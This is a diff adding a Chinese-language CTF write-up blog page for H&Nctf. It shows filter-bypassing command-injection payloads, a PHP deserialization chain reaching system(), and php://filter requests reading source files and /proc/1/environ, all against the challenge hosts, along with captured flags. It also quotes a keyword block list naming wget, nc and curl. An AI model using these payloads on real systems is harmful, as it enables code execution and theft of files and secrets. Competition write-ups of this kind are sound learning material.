@@ -1,0 +1,1321 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="H&amp;Nctf, Hexo">
+    <meta name="description" content="Really_Ez_Rce123456789101112131415161718192021222324252627282930&amp;lt;?phpheader(&#39;Content-Type: text/html; charset=utf-8&#39;)">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>H&amp;Nctf | Hexo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/lingqing777/lingqing777.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/lingqing777/lingqing777.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">H&amp;Nctf</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctf/">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/wp/">
+                                <span class="chip bg-color">wp</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-05-18
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2025-08-25
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.7k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    18 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h3 id="Really-Ez-Rce"><a href="#Really-Ez-Rce" class="headerlink" title="Really_Ez_Rce"></a>Really_Ez_Rce</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header('Content-Type: text/html; charset=utf-8');</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST['Number'])) {</span><br><span class="line">    $inputNumber = $_REQUEST['Number'];</span><br><span class="line">    </span><br><span class="line">    if (preg_match('/\d/', $inputNumber)) {</span><br><span class="line">        die("不行不行,不能这样");</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    if (intval($inputNumber)) {</span><br><span class="line">        echo "OK,接下来你知道该怎么做吗";</span><br><span class="line">        </span><br><span class="line">        if (isset($_POST['cmd'])) {</span><br><span class="line">            $cmd = $_POST['cmd'];</span><br><span class="line">            </span><br><span class="line">            if (!preg_match(</span><br><span class="line">                '/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\{|\}|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\'|\"|id/i',</span><br><span class="line">                $cmd</span><br><span class="line">            )) {</span><br><span class="line">                echo "你传的参数似乎挺正经的,放你过去吧&lt;br&gt;";</span><br><span class="line">                system($cmd);</span><br><span class="line">            } else {</span><br><span class="line">                echo "nonono,hacker!!!";</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST 'http://27.25.151.198:45344/?Number[]=a' \</span><br><span class="line">  -d 'cmd=a=l;b=s$IFS/;$a$b' </span><br><span class="line">  </span><br><span class="line">  or </span><br><span class="line">  cmd=a=l;b=s;$a$b /;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/50884168adea19e59625063d7c5a4a9a.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST 'http://27.25.151.198:45344/?Number[]=a' \</span><br><span class="line">  -d 'cmd=a=ca;b=t;c=se;d=d;e=di;f=r;$a$b /$($e$f -1 / | $c$d -n 5p);' </span><br><span class="line">  </span><br><span class="line">  cmd=a=l;b=s;$a$b /;c=s;d=ed;e=ca;f=t;$e$f /$($a$b / | $c$d -n 5p);</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/302de738747df8ca3cd597abb34f680a.png"></p>
+<blockquote>
+<ul>
+<li><code>dir -1</code>：和 <code>ls -1</code> 功能一样，会把目录中的内容按<strong>每行一个文件</strong>的形式列出来，并且<strong>默认按照字母顺序排序</strong>。</li>
+<li><code>sed -n 5p</code>：从输出结果里提取<strong>第五行</strong>，也就是第五个文件的名字。</li>
+<li>Sed 支持一下几种地址类型：<br>1、 first<del>step<br>这两个单词的意思： first 指起始匹配行， step 指步长，例如： sed -n 2</del>5p 含义：从第二行开始匹配，隔 5 行匹配一次，即 2,7,12…….。</li>
+<li><code>cat /$(...)</code><ul>
+<li><code>$(...)</code>：这是命令替换的语法，会先执行括号里的子命令，然后把执行结果替换到原命令中。</li>
+<li><code>cat /&lt;文件名&gt;</code>：读取根目录下对应文件的内容。</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/da4d38d1e0ce4e0752bc4444e60b68d3.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5994d10d3ab873da81790e22a678bb9d.png"></p>
+<hr>
+<h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11289">浅析PHP GC垃圾回收机制及常见利用方式-先知社区</a></p>
+<blockquote>
+<p><code>[0 =&gt; $name]</code>：</p>
+<ul>
+<li><p><code>0</code> 是数组的<strong>数字键</strong>（索引）。</p>
+</li>
+<li><p><code>$name</code> 是变量，作为数组对应键 <code>0</code> 的值。</p>
+</li>
+<li><p>等价于传统写法：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$arr</span>[<span class="number">0</span>] = <span class="variable">$name</span>;</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class GOGOGO{</span><br><span class="line">    public $dengchao;</span><br><span class="line">    function __destruct(){</span><br><span class="line">        //echo "Go Go Go~ 出发喽！";</span><br><span class="line">        echo "Go Go Go~ 出发喽！" . $this-&gt;dengchao;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">class DouBao{</span><br><span class="line">    public $dao;</span><br><span class="line">    public $Dagongren;</span><br><span class="line">    public $Bagongren;</span><br><span class="line">    function __toString(){</span><br><span class="line">        if( ($this-&gt;Dagongren != $this-&gt;Bagongren) &amp;&amp; (md5($this-&gt;Dagongren) === md5($this-&gt;Bagongren)) &amp;&amp; (sha1($this-&gt;Dagongren)=== sha1($this-&gt;Bagongren)) ){</span><br><span class="line">            //echo "诗人我吃！";</span><br><span class="line">            call_user_func_array($this-&gt;dao, ['诗人我吃！']);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">class HeiCaFei{</span><br><span class="line">    public $HongCaFei;</span><br><span class="line">    function __call($name, $arguments){</span><br><span class="line">        //echo "Hongkafei";</span><br><span class="line">        call_user_func_array($this-&gt;HongCaFei, [0 =&gt; $name]);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">if (isset($_POST['data'])) {</span><br><span class="line">    $temp = unserialize($_POST['data']);</span><br><span class="line">    //echo "What do you want to do?";</span><br><span class="line">    throw new Exception('What do you want to do?');//异常抛出,GC中的PHP反序列化时,demo已经给出了方法，即先传值给数组，而后将第二个索引置空即可</span><br><span class="line">} else {</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">}</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">array</span> <span class="variable">$param_arr</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><p><code>$callback</code>：要调用的回调函数（如函数名、类方法、闭包等）。</p>
+</li>
+<li><p><code>$param_arr</code>：传递给回调函数的参数数组。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 示例1：调用普通函数</span><br><span class="line">function sum($a, $b) {</span><br><span class="line">    return $a + $b;</span><br><span class="line">}</span><br><span class="line">echo call_user_func_array('sum', [10, 20]); // 输出：30</span><br><span class="line">        </span><br><span class="line">// 示例2：调用类方法</span><br><span class="line">class Math {</span><br><span class="line">    public static function multiply($a, $b) {</span><br><span class="line">        return $a * $b</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">echo call_user_func_array(['Math', 'multiply'], [5, 6]); // 输出：30</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class GOGOGO{</span><br><span class="line">    public $dengchao;</span><br><span class="line">}</span><br><span class="line">class DouBao{</span><br><span class="line">    public $dao;</span><br><span class="line">    public $Dagongren=[1];</span><br><span class="line">    public $Bagongren=[0];</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">class HeiCaFei{</span><br><span class="line">    public $HongCaFei="system";</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$a=new GOGOGO();</span><br><span class="line">$b=new DouBao();</span><br><span class="line">$c=new HeiCaFei();</span><br><span class="line"></span><br><span class="line">$a-&gt;dengchao=$b;</span><br><span class="line">$b-&gt;dao=[$c,"ls /"];</span><br><span class="line">$payload=[$a,0];</span><br><span class="line">echo serialize($payload);</span><br><span class="line"></span><br><span class="line">#a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:4:"ls /";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:0;}}}i:1;i:0;}</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>在PHP的<code>call_user_func_array()</code>中，回调函数的格式有严格要求：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array(callable $callback, array $args)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当<code>$callback</code>是<strong>数组形式</strong>时，PHP要求：</p>
+<ol>
+<li>数组第一个元素必须是<strong>对象实例</strong>（用于调用方法）</li>
+<li>数组第二个元素必须是<strong>字符串形式的方法名</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b-&gt;dao = [$c, "ls /"];</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><code>$c</code> 是 <code>HeiCaFei</code> 对象实例</li>
+<li><code>"ls /"</code> 是方法名字符串</li>
+<li>当调用时相当于：<code>$c-&gt;{"ls /"}('诗人我吃！')</code></li>
+<li>这会触发 <code>HeiCaFei::__call("ls /", ['诗人我吃！'])</code></li>
+<li>最终执行：<code>call_user_func_array("system", [0 =&gt; "ls /"])</code> → <code>system("ls /")</code></li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">data=a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:4:"ls /";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:0;}}}i:0;i:0;}</span><br><span class="line"></span><br><span class="line">bin dev etc home lib media mnt ofl1111111111ove4g opt proc root run sbin srv sys tmp usr var </span><br><span class="line"></span><br><span class="line">data=a:2:{i:0;O:6:"GOGOGO":1:{s:8:"dengchao";O:6:"DouBao":3:{s:3:"dao";a:2:{i:0;O:8:"HeiCaFei":1:{s:9:"HongCaFei";s:6:"system";}i:1;s:23:"cat /ofl1111111111ove4g";}s:9:"Dagongren";a:1:{i:0;i:1;}s:9:"Bagongren";a:1:{i:0;i:0;}}}i:0;i:0;}</span><br><span class="line"></span><br><span class="line">flag{615af7a8-f6e4-47e9-a3e2-d3c1f498d017} </span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h3 id="Watch"><a href="#Watch" class="headerlink" title="Watch"></a>Watch</h3><p><a target="_blank" rel="noopener" href="https://pkg.go.dev/vuln/GO-2023-2185">GO-2023-2185 - Go Packages</a></p>
+<p>Go 1.20 filepath 漏洞（GO-2023-2185）</p>
+<p>filepath 包无法识别带有？？\ 前缀的路径为特殊路径。在 Windows 系统中，以？？\ 开头的路径是 “根本地设备路径”，等效于以 ?\ 开头的路径 。带有？？\ 前缀的路径可用于访问系统上的任意位置。例如，路径？？\c:\x 等效于更常见的路径 c:\x 。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/a621a9cc97cef74629d1cf038a3e1315.png"></p>
+<hr>
+<h3 id="DeceptiFlag"><a href="#DeceptiFlag" class="headerlink" title="DeceptiFlag"></a>DeceptiFlag</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0cacf819119d25da9bd92ebb0b3fefab.png"></p>
+<p>将第二个隐藏框的display:none删了。然后第一个是xiyangyang，第二个是huitailang。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">看一下代码</span><br><span class="line">http://27.25.151.198:47543/tips.php?file=php://filter/convert.base64-encode/resource=tips.php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">// 为 PHP 7 添加 str_starts_with 函数兼容支持</span><br><span class="line">if (!function_exists('str_starts_with')) {</span><br><span class="line">    function str_starts_with($haystack, $needle) {</span><br><span class="line">        return strpos($haystack, $needle) === 0;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">if (!isset($_SESSION['verified']) || $_SESSION['verified'] !== true) {</span><br><span class="line">    header("Location: aicuo.php");</span><br><span class="line">    exit();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">if (!isset($_GET['file'])) {</span><br><span class="line">    header('Location: ?file=flag');</span><br><span class="line">    exit();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$file = trim($_GET['file']);</span><br><span class="line"></span><br><span class="line">if (preg_match('/\s/', $file)) {</span><br><span class="line">    die('Trying to use space huh?');</span><br><span class="line">}</span><br><span class="line">if (preg_match('/\.\./', $file)) {</span><br><span class="line">    die('Trying to include files from parent directory huh?');</span><br><span class="line">}</span><br><span class="line">if (preg_match('/^\//', $file) &amp;&amp; !str_starts_with($file, 'php://filter')) {</span><br><span class="line">    die('Trying to include files from root directory huh?');</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">if (str_starts_with($file, 'php://filter')) {</span><br><span class="line">    $content = @file_get_contents($file);</span><br><span class="line">    if ($content === false) {</span><br><span class="line">        die('无法读取文件');</span><br><span class="line">    }</span><br><span class="line">    echo $content;</span><br><span class="line">    exit();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">require_once $file . '.php';</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://27.25.151.198:47543/tips.php?file=php://filter/convert.base64-encode/resource=/proc/1/environ</span><br><span class="line">flag{0d4fd8a6-5024-43de-a590-f27ca70565e3}</span><br></pre></td></tr></tbody></table></figure>
+
